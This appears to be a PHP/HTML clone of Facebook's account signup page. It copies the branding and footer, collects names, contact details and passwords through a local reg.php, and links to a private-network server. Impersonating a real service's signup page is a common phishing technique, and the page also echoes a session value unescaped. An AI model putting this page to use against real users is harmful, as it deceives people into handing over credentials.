<!doctype html>
<?php session_start(); ?>
<html lang="en">
  <head>
  <title>Sign up for Facebook | Facebook</title>
    <!-- Required meta tags -->
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <link rel="icon" href="image/fb.ico">
    <link rel="stylesheet" href="css/signup.css">
    <link rel="stylesheet" href="css/mobile.css">
    <script src="JS/javascript.js"></script>
</head>
<body>
<div class="grey">
<center>
<img id="logo" src="image/fb.png" height="60" >

<div class="login" id="login">
<center>
<strong id="title">Create a new account</strong>
<p id="quick"> its quick and easy. </p>
<p id="line"></p>

<center>
<form action="reg.php" method="POST">
<input name="first_name" id="first_name" type="text" placeholder="First name" required="">
<input id="surname" name="surname" id="surname" type="text" placeholder="Surname" required="">
<input id="mobile" name="email" id="mobile" type="text" placeholder="Mobile number of email address" required="">
<input id="new_pass" name="new_pass" id="new_pass" type="password" placeholder="New password" required="Enter strong password" pattern="^(?=.*[a-z])(?=.*[A-Z])(?=.*[0-9])(?=.*[!@#$%^&*_=+-]).{6,24}$">
<label id="heading" for="Date of birth">Date of birth</label>
<div id="select">
<select name="day" id="day" required="">
  <option value="1">1</option>
  <option value="2">2</option>
  <option value="3">3</option>
  <option value="4">4</option>
  <option value="5">5</option>
  <option value="6">6</option>
  <option value="7">7</option>
  <option value="8">8</option>
  <option value="9">9</option>
  <option value="10">10</option>
  <option value="11">11</option>
  <option value="12">12</option>
  <option value="13">13</option>
  <option value="14">14</option>
  <option value="15">15</option>
  <option value="16">16</option>
  <option value="17">17</option>
  <option value="18">18</option>
  <option value="19">19</option>
  <option value="20">20</option>
  <option value="21">21</option>
  <option value="22">22</option>
  <option value="23">23</option>
  <option value="24">24</option>
  <option value="25">25</option>
  <option value="26">26</option>
  <option value="27">27</option>
  <option value="28">28</option>
  <option value="29">29</option>
  <option value="30">30</option>
  <option value="31">31</option>
</select>

<select name="month" id="month">
  <option value="Jan">Jan</option>
  <option value="Feb">Feb</option>
  <option value="Mar">Mar</option>
  <option value="April">April</option>
  <option value="May">May</option>
  <option value="June">June</option>
  <option value="July">July</option>
  <option value="Aug">Aug</option>
  <option value="Sep">Sep</option>
  <option value="Oct">Oct</option>
  <option value="Nov">Nov</option>
  <option value="Dec">Dec</option>
</select>

<select name="year" id="year">
  <option value="2022">2022</option>
  <option value="2021">2021</option>
  <option value="2020">2020</option>
  <option value="2019">2019</option>
  <option value="2018">2018</option>
  <option value="2017">2017</option>
  <option value="2016">2016</option>
  <option value="2015">2015</option>
  <option value="2014">2014</option>
  <option value="2013">2013</option>
  <option value="2012">2012</option>
  <option value="2011">2011</option>
  <option value="2010">2010</option>
  <option value="2009">2009</option>
  <option value="2008">2008</option>
  <option value="2007">2007</option>
  <option value="2006">2006</option>
  <option value="2005">2005</option>
  <option value="2004">2004</option>
  <option value="2003">2003</option>
  <option value="2002">2002</option>
  <option value="2001">2001</option>
  <option value="2000">2000</option>
  <option value="1999">1999</option>
  <option value="1998">1998</option>
  <option value="1997">1997</option>
  <option value="1996">1996</option>
  <option value="1995">1995</option>
  <option value="1994">1994</option>
  <option value="1993">1993</option>
  <option value="1992">1992</option>
  <option value="1991">1991</option>
  <option value="1990">1990</option>
  <option value="1989">1989</option>
  <option value="1988">1988</option>
  <option value="1987">1987</option>
  <option value="1986">1986</option>
  <option value="1985">1985</option>
  <option value="1984">1984</option>
  <option value="1983">1983</option>
  <option value="1982">1982</option>
  <option value="1981">1981</option>
  <option value="1980">1980</option>
  <option value="1979">1979</option>
  <option value="1978">1978</option>
  <option value="1977">1977</option>
  <option value="1976">1976</option>
  <option value="1975">1975</option>
  <option value="1974">1974</option>
  <option value="1973">1973</option>
  <option value="1972">1972</option>
  <option value="1971">1971</option>
  <option value="1970">1970</option>
  <option value="1969">1969</option>
  <option value="1968">1968</option>
  <option value="1967">1967</option>
  <option value="1966">1966</option>
  <option value="1965">1965</option>
  <option value="1964">1964</option>
  <option value="1963">1963</option>
  <option value="1962">1962</option>
  <option value="1961">1961</option>
  <option value="1960">1960</option>
  <option value="1959">1959</option>
  <option value="1958">1958</option>
  <option value="1957">1957</option>
  <option value="1956">1956</option>
  <option value="1955">1955</option>
  <option value="1954">1954</option>
  <option value="1953">1953</option>
  <option value="1952">1952</option>
  <option value="1951">1951</option>
  <option value="1950">1950</option>
  <option value="1949">1949</option>
  <option value="1948">1948</option>
  <option value="1947">1947</option>
  <option value="1946">1946</option>
  <option value="1945">1945</option>
  <option value="1944">1944</option>
  <option value="1943">1943</option>
  <option value="1942">1942</option>
  <option value="1941">1941</option>
  <option value="1940">1940</option>
  <option value="1939">1939</option>
  <option value="1938">1938</option>
  <option value="1937">1937</option>
  <option value="1936">1936</option>
  <option value="1935">1935</option>
  <option value="1934">1934</option>
  <option value="1933">1933</option>
  <option value="1932">1932</option>
  <option value="1931">1931</option>
  <option value="1930">1930</option>
  <option value="1929">1929</option>
  <option value="1928">1928</option>
  <option value="1927">1927</option>
  <option value="1926">1926</option>
  <option value="1925">1925</option>
  <option value="1924">1924</option>
  <option value="1923">1923</option>
  <option value="1922">1922</option>
  <option value="1921">1921</option>
  <option value="1920">1920</option>
  <option value="1919">1919</option>
  <option value="1918">1918</option>
  <option value="1917">1917</option>
  <option value="1916">1916</option>
  <option value="1915">1915</option>
  <option value="1914">1914</option>
  <option value="1913">1913</option>
  <option value="1912">1912</option>
  <option value="1911">1911</option>
  <option value="1910">1910</option>
  <option value="1909">1909</option>
  <option value="1908">1908</option>
  <option value="1907">1907</option>
  <option value="1906">1906</option>
  <option value="1905">1905</option>
</select>
</div>

<label id="heading" for="Gender">Gender</label>
<input onclick='remove()' id="genderF" name="female" value="Female" type="text" placeholder="Female" required="" readonly>
<input onclick='remove()' id="genderM" name="male" value="Male" type="text" placeholder="Male" required="" readonly>
<input onclick="input()" id="genderC" name="custom" value="Custom" type="text" placeholder="Custom" required="" readonly>
<p id="input2"></p>
<p id="terms">By clicking Sign Up, you agree to our Terms, Data Policy and Cookie Policy. You may receive SMS notifications from us and can opt out at any time.</p>

<button id="signup" type="submit">Signup</button>

<a href="http://10.1.1.112:8000" id="account" href=""><p id="account" href="">Already have an account? </p></a>

<?php echo $_SESSION['res']; ?>
</div>
<br>
</div>
</form>

<div class="lang">
<center>
<ul>
<li><p id="english">English(UK)</p>
</li>
<li><a href="https://zh-cn.facebook.com/login.php">中文(简体)</a>
</li>
<li><a href="https://zh-cn.facebook.com/login.php">한국어</a>
</li>
<li><a href="https://ja-jp.facebook.com/login.php">Français (France)</a>
</li>
<li><a href="https://es-la.facebook.com/login.php">Español</a>
</li>
<li><a href="https://de-de.facebook.com/login.php">Deutsch</a>
</li>
<li><a href="https://it-it.facebook.com/login.php">Italiano</a>
</li>
<li><a href="https://pt-br.facebook.com/login.php">Português (Brasil)</a>
</li>
<li><a href="https://ar-ar.facebook.com/login.php">العربية</a>
</li>
<li><a href="https://hi-in.facebook.com/login.php">हिन्दी</a>
</li>
</ul>
</center>
</div>

<center>
<p id="underline"></p>
</center>

<div class="items">
<center>
<ul>
<li><a href="http://10.1.1.112:8000/Reg/signup.php">Sign up</a>
</li>
<li><a href="http://10.1.1.112:8000">Log in</a>
</li>
<li><a target="_blank" href="https://messenger.com/">Messenger</a>
</li>
<li><a target="_blank" href="https://facebook.com/lite/">Facebook Lite</a>
</li> 
<li><a target="_blank" href="https://www.facebook.com/watch/">Watch</a>
</li>
<li><a target="_blank" href="https://facebook.com/places/">Places</a>
</li>
<li><a target="_blank" href="https://facebook.com/games/">Games</a>
</li>
<li><a target="_blank" href="https://facebook.com/marketplace/">Marketplace</a>
</li>
<li><a target="_blank" href="https://pay.facebook.com/">Facebook Pay</a>
</li>
<li><a target="_blank" href="https://facebook.com/jobs/">Jobs</a>
</li>
<li><a target="_blank" href="https://www.oculus.com/">Occulus</a>
</li>
<li><a target="_blank" href="https://portal.facebook.com/">Portal</a>
</li>
<li><a target="_blank" href="https://www.instagram.com/">Instagram</a>
</li>
<li><a target="_blank" href="https://www.bulletin.com/">Bulltin</a>
</li>
<li><a target="_blank" href="https://facebook.com/local/lists/245019872666104/">Local</a>
</li>
</ul>

<ul>
<li><a target="_blank" href="https://facebook.com/fundraisers/">Fundraisers</a>
</li>
<li><a target="_blank" href="https://facebook.com/biz/directory/">Services</a>
</li>
<li><a target="_blank" href="https://facebook.com/votinginformationcenter/?entry_point=c2l0ZQ%3D%3D">Voting Information Centre</a>
</li>
<li><a target="_blank" href="https://facebook.com/groups/explore/">Groups</a>
</li>
<li><a target="_blank" href="https://about.facebook.com/">About</a>
</li>
<li><a target="_blank" href="https://facebook.com/ad_campaign/landing.php?placement=pflo&campaign_id=402047449186&nav_source=unknown&extra_1=auto">Create ad</a>
</li>
<li><a target="_blank" href="https://facebook.com/pages/create/?ref_type=site_footer">Create Page</a>
</li>
<li><a target="_blank" href="https://developers.facebook.com/?ref=pf">Developers</a>
</li>
<li><a target="_blank" href="https://facebook.com/careers/?ref=pf">Careers</a>
</li>
<li><a target="_blank" href="https://facebook.com/privacy/explanation">Privacy</a>
</li>
<li><a target="_blank" href="https://facebook.com/policies/cookies/">Cookies</a>
</li>
<li><a target="_blank" href="https://www.facebook.com/help/568137493302217">AdChoices</a>
</li>
<li><a target="_blank" href="https://facebook.com/policies?ref=pf">Terms</a>
</li>
</ul>
</div>

<center>
<p id="meta">Meta &copy; 2022</p>
</center>
</body>
</html> 


